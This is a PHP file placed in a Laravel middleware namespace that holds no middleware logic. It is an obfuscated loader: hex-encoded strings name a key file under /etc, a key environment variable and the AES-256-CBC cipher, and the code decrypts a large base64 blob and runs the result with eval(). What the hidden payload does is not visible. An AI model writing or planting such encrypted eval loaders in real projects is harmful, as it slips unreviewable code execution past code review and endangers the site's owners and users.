<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('i0RAKs0YnjGkDpxTZW/Ybw==');

$c=base64_decode(

'CUNqVgjaGQAnKh5eYtOuqjDg/IguVVlbeg/BRCgZ8T3hxWxv2pPte5yVvAlsSHfu4E/i8bt5oIVX' .
'EeMHN15CCpfYWq6tw9l5+P8a+pycKC3pUfhRfafIUypq+jd1Y7c6NSOTvaEWH2XKRI18UH2K8m+q' .
'a6N+ijk+n+30zAWkScaSAMw3F5ETnSA4FkZiIdkQJhoYL61Fk6AICt5gJI/4UyaXHAqh2THbcuM7' .
'DNQV92sEukTlhUqAe5hjAd+UBQJ0LYFsCxOSmWss5imIKa+Pdb1yhvuOtRRv788TE2swYqMzm5LQ' .
'P6rYJ5mcJqrLXIYm+aG0UpVWY1kHcqAWxe4vJPZHQM6Ai8U6wVOCb9MBfwnDlQ7Ru3B4Dxh2e12h' .
'VCGt7/WF/lALKh4cXrHc7/l/Sq2EWOqyMToDLVz0bDBvcZ8TvQUEKe1VCa0J0S1BHcMJe15b4mJa' .
'u/E8LHQNT7qz8qFSFeTu8d5UHFBZISMninXc2abzI2EPQEAmuqNR5SFfhrqT4rNzjBOmUUtqaht3' .
'Mpy2kmxOc0Obh9grIHKWieMTvDWjp6D5Q9IPza3j6JEYUKMdVYyFmsYm87vqRip24oRF7xr8tSmy' .
'5TatvbbMl4h5eXoyIIa2g7liwaY+gKrGGCc3O9VRHC5D0G3VRu7ww29c63co4CeDfFSqAHDsDqwB' .
'qna8FjAEzABImiszOApjeQd/41/hiVWMj5zuWJH+/2GwXtKPX+EnaCwWjTZZCUZCn6E3JR7mNbAK' .
'Mqgfbp/L7KP/AgOzylt/LluV3QdkyjoIdrIslF4atv8cLgyfaTGswGFKGwPZMKZpm6h0Tqs41kEb' .
'jKS1cb/e8R0wT50XDn91Nwg1Kg/2MajAbfOveWyhrBNh4Ap9eMpkf3jr46Vjf59pminMZjk3X+OT' .
'gzae63rK5SfvmWq6N5VDo5oYBBOBu2P9aJvxnIgnVX0EccoNNYvHh48XS2qHKlpnJ75qgfCQnOnI' .
'DdjxWKwWHePWpoLnz0iMt37WhHU3DOsXRWJdhI9aGY+IQGhe3XdSWnkBefPtgXQDdKVlS/veMl9n' .
'Da/Pny6pSaB9kPwVr8//Ca6Tf9qvx64WqDXY+9DMDpOqM3Zix4PkmfngavQEzUkA3g1uho4J9cKz' .
'NmUcRZv+04wjsJtJ1pOq13UiXSnyQ04zecZglIKFtVXkWHWxjOmxibOz3XR4mneynrmfMt23PAlf' .
'GCGuErmyabjsiXsKOHkqMe9dCU9jpnYZXuCRLBjutoa1zgidagVa1x1bGGiPPC4GH2HuIsREnnuk' .
'8uXRCsLrS7HS19j5w4q8hJt0ZaEgoY9LANA/apgX8s1G4t6k3P5VdDtjGuvPOD7/nhqycbUweR1O' .
'zN+kiwMuY4rk6izL4ysUm81zfNDDpJyED440SCBDtNLsz7yTsYKXfPjcd/QCeKoL38VWF5vuL1VA' .
'PS2cRjhd+ZxJ2qJU1w11bKcq1RgtlXeiQBl77vp8Kb3VMjpAPZzZMqn6NM4TLVkqTC/k8j3Sq3wP' .
'YhgKb/HnWyP0H6QlVXXD+/C6xoG2LZ0b7VxJfg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

